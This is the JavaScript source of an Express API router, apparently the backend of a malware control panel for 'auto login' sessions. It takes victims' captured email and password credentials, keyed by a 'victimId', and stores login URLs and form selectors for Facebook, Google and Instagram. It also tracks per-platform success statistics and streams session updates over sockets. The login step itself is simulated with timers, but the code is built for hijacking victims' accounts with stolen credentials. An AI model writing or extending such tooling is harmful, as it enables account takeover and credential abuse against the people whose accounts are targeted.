import express from "express";
const router = express.Router();

// Mock storage for auto login sessions
let loginSessions = [];
let sessionStats = {
  totalLogins: 156,
  successRate: 87.5,
  activeSessions: 0,
  platformBreakdown: {
    facebook: { total: 89, success: 78 },
    google: { total: 34, success: 31 },
    instagram: { total: 23, success: 18 },
    tiktok: { total: 10, success: 8 },
    twitter: { total: 5, success: 4 },
    linkedin: { total: 3, success: 3 },
  },
};

// Platform configurations
const PLATFORMS = {
  facebook: {
    name: "Facebook",
    loginUrl: "https://www.facebook.com/login.php",
    selectors: {
      email: "#email",
      password: "#pass",
      loginButton: '[name="login"]',
    },
  },
  google: {
    name: "Google",
    loginUrl: "https://accounts.google.com/signin",
    selectors: {
      email: "#identifierId",
      password: '[name="password"]',
      nextButton: "#identifierNext",
    },
  },
  instagram: {
    name: "Instagram",
    loginUrl: "https://www.instagram.com/accounts/login/",
    selectors: {
      email: '[name="username"]',
      password: '[name="password"]',
      loginButton: '[type="submit"]',
    },
  },
};

// Helper function to generate session ID
const generateSessionId = () => {
  return `session_${Date.now()}_${Math.random().toString(36).substr(2, 8)}`;
};

// Helper function to emit real-time updates
const emitSessionUpdate = (req, sessionData) => {
  const io = req.app.get("io");
  if (io) {
    io.emit("auto_login:session_update", sessionData);
  }
};

// GET /api/auto-login/sessions - Get all login sessions
router.get("/sessions", (req, res) => {
  try {
    const { status, platform, limit = 50 } = req.query;

    let filteredSessions = [...loginSessions];

    if (status && status !== "all") {
      filteredSessions = filteredSessions.filter((s) => s.status === status);
    }

    if (platform && platform !== "all") {
      filteredSessions = filteredSessions.filter(
        (s) => s.platform === platform
      );
    }

    // Sort by start time (newest first)
    filteredSessions.sort(
      (a, b) => new Date(b.startTime) - new Date(a.startTime)
    );

    // Apply limit
    if (limit) {
      filteredSessions = filteredSessions.slice(0, parseInt(limit));
    }

    res.json({
      success: true,
      data: filteredSessions,
      total: loginSessions.length,
      filtered: filteredSessions.length,
    });
  } catch (error) {
    console.error("Error getting login sessions:", error);
    res.status(500).json({
      success: false,
      message: "Failed to get login sessions",
      error: error.message,
    });
  }
});

// GET /api/auto-login/stats - Get login statistics
router.get("/stats", (req, res) => {
  try {
    // Update active sessions count
    sessionStats.activeSessions = loginSessions.filter(
      (s) => s.status === "in_progress"
    ).length;

    res.json({
      success: true,
      data: sessionStats,
    });
  } catch (error) {
    console.error("Error getting login stats:", error);
    res.status(500).json({
      success: false,
      message: "Failed to get login stats",
      error: error.message,
    });
  }
});

// POST /api/auto-login/start - Start new auto login session
router.post("/start", (req, res) => {
  try {
    const { platformId, credentials, victimId, options = {} } = req.body;

    // Validate required fields
    if (!platformId || !credentials || !victimId) {
      return res.status(400).json({
        success: false,
        message: "Missing required fields: platformId, credentials, victimId",
      });
    }

    if (!credentials.email || !credentials.password) {
      return res.status(400).json({
        success: false,
        message: "Missing credentials: email and password required",
      });
    }

    // Check if platform is supported
    if (!PLATFORMS[platformId]) {
      return res.status(400).json({
        success: false,
        message: `Unsupported platform: ${platformId}`,
      });
    }

    // Create new session
    const sessionId = generateSessionId();
    const newSession = {
      id: sessionId,
      platform: platformId,
      platformName: PLATFORMS[platformId].name,
      victimId,
      userEmail: credentials.email,
      status: "initializing",
      startTime: new Date().toISOString(),
      endTime: null,
      duration: null,
      currentStep: "initializing",
      steps: [
        {
          step: "initializing",
          timestamp: new Date().toISOString(),
          status: "in_progress",
        },
      ],
      options,
      error: null,
      result: null,
    };

    // Add to sessions array
    loginSessions.unshift(newSession);

    // Emit real-time update
    const io = req.app.get("io");
    if (io) {
      io.emit("auto_login:new_session", newSession);
    }

    // Simulate auto login process (in real implementation, this would be handled by victim)
    setTimeout(() => {
      simulateLoginProcess(
        req,
        sessionId,
        platformId,
        credentials,
        victimId,
        options
      );
    }, 1000);

    res.json({
      success: true,
      data: {
        sessionId,
        status: "started",
        message: "Auto login session started successfully",
      },
    });
  } catch (error) {
    console.error("Error starting auto login:", error);
    res.status(500).json({
      success: false,
      message: "Failed to start auto login session",
      error: error.message,
    });
  }
});

// POST /api/auto-login/cancel/:sessionId - Cancel login session
router.post("/cancel/:sessionId", (req, res) => {
  try {
    const { sessionId } = req.params;

    const sessionIndex = loginSessions.findIndex((s) => s.id === sessionId);
    if (sessionIndex === -1) {
      return res.status(404).json({
        success: false,
        message: "Session not found",
      });
    }

    const session = loginSessions[sessionIndex];

    // Only allow cancelling in-progress sessions
    if (session.status !== "in_progress" && session.status !== "initializing") {
      return res.status(400).json({
        success: false,
        message: "Cannot cancel session in current state",
      });
    }

    // Update session status
    session.status = "cancelled";
    session.endTime = new Date().toISOString();
    session.duration = Date.now() - new Date(session.startTime).getTime();
    session.steps.push({
      step: "cancelled",
      timestamp: new Date().toISOString(),
      status: "completed",
    });

    // Emit real-time update
    emitSessionUpdate(req, session);

    res.json({
      success: true,
      data: session,
      message: "Session cancelled successfully",
    });
  } catch (error) {
    console.error("Error cancelling session:", error);
    res.status(500).json({
      success: false,
      message: "Failed to cancel session",
      error: error.message,
    });
  }
});

// GET /api/auto-login/session/:sessionId - Get session details
router.get("/session/:sessionId", (req, res) => {
  try {
    const { sessionId } = req.params;

    const session = loginSessions.find((s) => s.id === sessionId);
    if (!session) {
      return res.status(404).json({
        success: false,
        message: "Session not found",
      });
    }

    res.json({
      success: true,
      data: session,
    });
  } catch (error) {
    console.error("Error getting session details:", error);
    res.status(500).json({
      success: false,
      message: "Failed to get session details",
      error: error.message,
    });
  }
});

// DELETE /api/auto-login/sessions - Clear old sessions
router.delete("/sessions", (req, res) => {
  try {
    const { olderThan = 24 } = req.query; // hours

    const cutoffTime = new Date(Date.now() - olderThan * 60 * 60 * 1000);
    const initialCount = loginSessions.length;

    // Keep only recent sessions and active sessions
    loginSessions = loginSessions.filter((session) => {
      const sessionTime = new Date(session.startTime);
      return sessionTime > cutoffTime || session.status === "in_progress";
    });

    const removedCount = initialCount - loginSessions.length;

    res.json({
      success: true,
      message: `Removed ${removedCount} old sessions`,
      data: {
        removed: removedCount,
        remaining: loginSessions.length,
      },
    });
  } catch (error) {
    console.error("Error clearing sessions:", error);
    res.status(500).json({
      success: false,
      message: "Failed to clear sessions",
      error: error.message,
    });
  }
});

// Simulate auto login process (for development/testing)
async function simulateLoginProcess(
  req,
  sessionId,
  platformId,
  credentials,
  victimId,
  options
) {
  const session = loginSessions.find((s) => s.id === sessionId);
  if (!session) return;

  const steps = ["navigation", "fill_credentials", "submit", "post_login"];
  const stepDurations = [2000, 3000, 4000, 2000]; // milliseconds

  try {
    for (let i = 0; i < steps.length; i++) {
      const stepName = steps[i];

      // Update current step
      session.currentStep = stepName;
      session.status = "in_progress";
      session.steps.push({
        step: stepName,
        timestamp: new Date().toISOString(),
        status: "in_progress",
      });

      emitSessionUpdate(req, session);

      // Simulate step processing time
      await new Promise((resolve) => setTimeout(resolve, stepDurations[i]));

      // Random chance of failure for testing
      if (Math.random() < 0.1 && stepName !== "post_login") {
        // 10% failure rate
        session.status = "failed";
        session.error = `Failed at ${stepName} step`;
        session.endTime = new Date().toISOString();
        session.duration = Date.now() - new Date(session.startTime).getTime();
        session.steps[session.steps.length - 1].status = "failed";

        emitSessionUpdate(req, session);
        return;
      }

      // Mark step as completed
      session.steps[session.steps.length - 1].status = "completed";
      emitSessionUpdate(req, session);
    }

    // Success
    session.status = "completed";
    session.endTime = new Date().toISOString();
    session.duration = Date.now() - new Date(session.startTime).getTime();
    session.result = {
      loginUrl: PLATFORMS[platformId].loginUrl,
      redirectUrl:
        options.redirectAfterLogin || `${PLATFORMS[platformId].loginUrl}/home`,
      screenshot: options.takeScreenshot ? `${sessionId}_success.png` : null,
    };

    // Update stats
    if (!sessionStats.platformBreakdown[platformId]) {
      sessionStats.platformBreakdown[platformId] = { total: 0, success: 0 };
    }
    sessionStats.platformBreakdown[platformId].total++;
    sessionStats.platformBreakdown[platformId].success++;
    sessionStats.totalLogins++;

    // Recalculate success rate
    const totalSuccess = Object.values(sessionStats.platformBreakdown).reduce(
      (sum, platform) => sum + platform.success,
      0
    );
    sessionStats.successRate = (
      (totalSuccess / sessionStats.totalLogins) *
      100
    ).toFixed(1);

    emitSessionUpdate(req, session);
  } catch (error) {
    session.status = "failed";
    session.error = error.message;
    session.endTime = new Date().toISOString();
    session.duration = Date.now() - new Date(session.startTime).getTime();

    emitSessionUpdate(req, session);
  }
}

export default router;
